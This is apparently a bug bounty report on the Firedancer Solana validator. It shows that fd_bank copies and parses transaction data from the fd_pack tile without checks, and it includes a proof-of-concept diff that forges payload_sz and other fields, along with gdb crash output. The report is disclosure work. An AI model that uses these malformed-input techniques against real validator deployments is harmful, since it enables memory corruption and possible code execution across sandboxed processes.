# Boost \_ Firedancer v0.1 33774 - \[Blockchain\_DLT - Medium] The malicious fd\_txn\_p\_t data passed betwe

Submitted on Mon Jul 29 2024 04:49:24 GMT-0400 (Atlantic Standard Time) by @c4a4dda89 for [Boost | Firedancer v0.1](https://immunefi.com/bounty/firedancer-boost/)

Report ID: #33774

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/firedancer-io/firedancer/tree/e60d9a6206efaceac65a5a2c3a9e387a79d1d096>

Impacts:

* Process to process RCE between sandboxed tiles

## Description

## Brief/Intro

The `fd_mux_during_frag_fn` is called after the mux has received a new frag.

```c
/* fd_mux_during_frag_fn is called after the mux has received a new frag
   from an in, but before the mux has checked that it was overrun.  This
   callback is not invoked if the mux is backpressured, as it would not
   try and read a frag from an in in the first place (instead, leaving
   it on the in mcache to backpressure the upstream producer).  in_idx
   will be the index of the in that the frag was received from.

   If the producer of the frags is respecting flow control, it is safe
   to read frag data in any of the callbacks, but it is suggested to
   copy or read frag data within this callback, as if the producer does
   not respect flow control, the frag may be torn or corrupt due to an
   overrun by the reader.  If the frag being read from has been
   overwritten while this callback is running, the frag will be ignored
   and the mux will not call the process function.  Instead it will
   recover from the overrun and continue with new frags.

   This function cannot fail.  If opt_filter is set to non-zero, it
   means the frag should be filtered and not passed on to downstream
   consumers of the mux.

   The ctx is a user-provided context object from when the mux tile was
   initialized.

   seq, sig, chunk, and sz are the respective fields from the mcache
   fragment that was received.  If the producer is not respecting flow
   control, these may be corrupt or torn and should not be trusted,
   except for seq which is read atomically. */

typedef void (fd_mux_during_frag_fn)( void * ctx,
                                      ulong  in_idx,
                                      ulong  seq,
                                      ulong  sig,
                                      ulong  chunk,
                                      ulong  sz,
                                      int *  opt_filter );
```

Specifically, the parameters `seq`, `sig`, `chunk`, and `sz` originate from the received mcache fragment. Since the producer could be compromised, these fields are considered untrusted.

## Vulnerability Details

In the file `fd_bank.c` located at `src/app/fdctl/run/tiles`, when the `during_frag` process receives data from fd\_pack, at the code point \[1], the data is directly copied to `ctx->out_mem` without any checks.

```c
static inline void
during_frag( void * _ctx,
             ulong  in_idx,
             ulong  seq,
             ulong  sig,
             ulong  chunk,
             ulong  sz,
             int *  opt_filter ) {
  (void)in_idx;
  (void)seq;
  (void)sig;
  (void)opt_filter;

  fd_bank_ctx_t * ctx = (fd_bank_ctx_t *)_ctx;

  uchar * src = (uchar *)fd_chunk_to_laddr( ctx->pack_in_mem, chunk );
  uchar * dst = (uchar *)fd_chunk_to_laddr( ctx->out_mem, ctx->out_chunk ); 

  if( FD_UNLIKELY( chunk<ctx->pack_in_chunk0 || chunk>ctx->pack_in_wmark || sz>USHORT_MAX ) )
    FD_LOG_ERR(( "chunk %lu %lu corrupt, not in range [%lu,%lu]", chunk, sz, ctx->pack_in_chunk0, ctx->pack_in_wmark ));

  fd_memcpy( dst, src, sz-sizeof(fd_microblock_bank_trailer_t) ); // [1] directly copied
  fd_microblock_bank_trailer_t * trailer = (fd_microblock_bank_trailer_t *)( src+sz-sizeof(fd_microblock_bank_trailer_t) );
  ctx->_bank = trailer->bank;
}
```

In the subsequent logic of `fd_bank`, when the `after_frag` function calls `fd_bank_abi_txn_init` to handle the maliciously constructed `fd_txn_p_t` passed through IPC by `fd_pack`, various memory safety issues may arise.

Taking the construction of a malicious `txn->payload_sz` as an example, when `payload_sz` is maliciously constructed data, subsequent calls to `fd_blake3_append` can lead to memory safety issues.

```c
static inline void
after_frag( void *             _ctx,
            ulong              in_idx,
            ulong              seq,
            ulong *            opt_sig,
            ulong *            opt_chunk,
            ulong *            opt_sz,
            ulong *            opt_tsorig,
            int *              opt_filter,
            fd_mux_context_t * mux ) {
  (void)in_idx;
  (void)opt_chunk;
  (void)opt_tsorig;
  (void)opt_filter;

  fd_bank_ctx_t * ctx = (fd_bank_ctx_t *)_ctx;

  uchar * dst = (uchar *)fd_chunk_to_laddr( ctx->out_mem, ctx->out_chunk );

  ulong txn_cnt = (*opt_sz-sizeof(fd_microblock_bank_trailer_t))/sizeof(fd_txn_p_t);

  ulong sanitized_txn_cnt = 0UL;
  ulong sidecar_footprint_bytes = 0UL;
  for( ulong i=0UL; i<txn_cnt; i++ ) {
    fd_txn_p_t * txn = (fd_txn_p_t *)( dst + (i*sizeof(fd_txn_p_t)) );

    void * abi_txn = ctx->txn_abi_mem + (sanitized_txn_cnt*FD_BANK_ABI_TXN_FOOTPRINT);
    void * abi_txn_sidecar = ctx->txn_sidecar_mem + sidecar_footprint_bytes;

    int result = fd_bank_abi_txn_init( abi_txn, abi_txn_sidecar, ctx->_bank, ctx->blake3, txn->payload, txn->payload_sz, TXN(txn), !!(txn->flags & FD_TXN_P_FLAGS_IS_SIMPLE_VOTE) ); // use maliciously txn->payload_sz 
    ctx->metrics.txn_load_address_lookup_tables[ result ]++;
    if( FD_UNLIKELY( result!=FD_BANK_ABI_TXN_INIT_SUCCESS ) ) continue;

    txn->flags |= FD_TXN_P_FLAGS_SANITIZE_SUCCESS;

    fd_txn_t * txn1 = TXN(txn);
    sidecar_footprint_bytes += FD_BANK_ABI_TXN_FOOTPRINT_SIDECAR( txn1->acct_addr_cnt, txn1->addr_table_adtl_cnt, txn1->instr_cnt, txn1->addr_table_lookup_cnt );
    sanitized_txn_cnt++;
  }
```

```c
int
fd_bank_abi_txn_init( fd_bank_abi_txn_t * out_txn,
                      uchar *             out_sidecar,
                      void const *        bank,
                      fd_blake3_t *       blake3,
                      uchar *             payload,
                      ulong               payload_sz,
                      fd_txn_t *          txn,
                      int                 is_simple_vote ) {
  out_txn->signatures_cnt = txn->signature_cnt;
  out_txn->signatures_cap = txn->signature_cnt;
  out_txn->signatures     = (void*)(payload + txn->signature_off);

  fd_blake3_init( blake3 );
  fd_blake3_append( blake3, "solana-tx-message-v1", 20UL );
  fd_blake3_append( blake3, payload + txn->message_off, payload_sz - txn->message_off ); //crash here
  fd_blake3_fini( blake3, out_txn->message_hash );

//...
}
```

```shell
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007dc67d6ecadf in __GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, warning: Could not find DWO CU /home/user/firedancer/solana/target/release-with-debug/deps/solana_core-2ed32eca82f272f5.solana_core.4822307bae9ea110-cgu.15.rcgu.dwo(0x30dbb07486b8ba) referenced by CU at offset 0x242378 [in module /home/user/firedancer/build/native/gcc/bin/fddev]
req=0x7dc67cbfc3d0, rem=0x7dc67cbfc3d0)
    at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:78
warning: 78	../sysdeps/unix/sysv/linux/clock_nanosleep.c: No such file or directory
(gdb) c
Continuing.
(gdb)
Thread 276 "bank:0" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x5fbcb45ff6c0 (LWP 848261)]
blake3_hash_many_avx2 () at c/blake3_avx2_x86-64_unix.S:89
89	        vinsertf128 ymm8, ymm8, xmmword ptr [r12+rdx-0x40], 0x01
(gdb) p/x $r12
$1 = 0x328680000d2d
(gdb) p/x $rdx
$2 = 0x40
(gdb) bt
#0  blake3_hash_many_avx2 () at c/blake3_avx2_x86-64_unix.S:89
#1  0x0000000000000000 in ?? ()
(gdb)
```

## Impact Details

Process-to-process memory corruption may lead to the process-to-process RCE between sandboxed tiles.

## References

<https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_bank.c#L126>

<https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/app/fdctl/run/tiles/fd\\_bank.c#L181>

<https://github.com/firedancer-io/firedancer/blob/e60d9a6206efaceac65a5a2c3a9e387a79d1d096/src/disco/bank/fd\\_bank\\_abi.c#L284>

## Proof of concept

The attack surface of this vulnerability is when an attacker has arbitrary code execution rights over `fd_pack`, and then launches a process to process RCE attack on `fd_bank`. Therefore, we modify the relevant code of the `fd_pack` process to simulate the situation where the attacker has already obtained the ability to execute code.

The project side realized that the modified content shown by the git diff needs to be synchronized to the local environment. By executing `make -j fddev` and `sudo fddev --no-sandbox`, a crash can be triggered.

```shell
diff --git a/src/app/fdctl/run/tiles/fd_pack.c b/src/app/fdctl/run/tiles/fd_pack.c
index 29b27221..3ef53278 100644
@@ -394,6 +396,35 @@ after_credit( void *             _ctx,
       trailer->bank = ctx->leader_bank;

       ulong sig = fd_disco_poh_sig( ctx->leader_slot, POH_PKT_TYPE_MICROBLOCK, (ulong)i );
+
+
+      fd_txn_p_t * my_txn = (fd_txn_p_t *)microblock_dst;
+      //poc1
+      my_txn->payload_sz=0x41414141;
+      //poc2
+      //TXN(my_txn)->message_off = 0x4141;
+      //poc3 rust crash
+      //TXN(my_txn)->instr_cnt = 0x4141;
+      /*
+       * thread '<unnamed>' panicked at /home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22:
+       * program id index is sanitized
+       * note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+       * ERR     07-29 12:40:17.435789 872498 f17  0    metrics/src/metrics.rs(283): datapoint: panic program="validator" thread="?" one=1i message="panicked at /home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22:
+       * program id index is sanitized" location="/home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22" version="0.101.11817 (src:e60d9a62; feat:4215500110, client:Firedancer)"
+       * ERR     07-29 12:40:17.541403 872403 f0   pidns src/app/fdctl/run/run.c(368): tile solana-labs:0 exited with code 1
+       */
+
+      //poc4
+      //memset(TXN(my_txn)->instr,0x41,8) ;
+      /*
+       * thread '<unnamed>' panicked at /home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22:
+       * program id index is sanitized
+       * note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+       * ERR     07-29 12:38:50.637422 871464 f17  0    metrics/src/metrics.rs(283): datapoint: panic program="validator" thread="?" one=1i message="panicked at /home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22:
+       * program id index is sanitized" location="/home/ht/firedancer/solana/sdk/program/src/message/sanitized.rs:188:22" version="0.101.11817 (src:e60d9a62; feat:4215500110, client:Firedancer)"
+       * ERR     07-29 12:38:50.745302 871372 f0   pidns src/app/fdctl/run/run.c(368): tile solana-labs:0 exited with code 1
+       */
+
       fd_mux_publish( mux, sig, chunk, msg_sz+sizeof(fd_microblock_bank_trailer_t), 0UL, 0UL, tspub );
       ctx->bank_expect[ i ] = *mux->seq-1UL;
       ctx->bank_ready_at[i] = now + (long)ctx->microblock_duration_ticks;
```

Only the crash log for PoC1 is listed here. Replacing the code of PoC1 with other PoC will yield different crash reasons. We believe that there are at least three different vulnerabilities in the parsing code here that could lead to crashes. PoC3 and PoC4 will even trigger crash in rust.
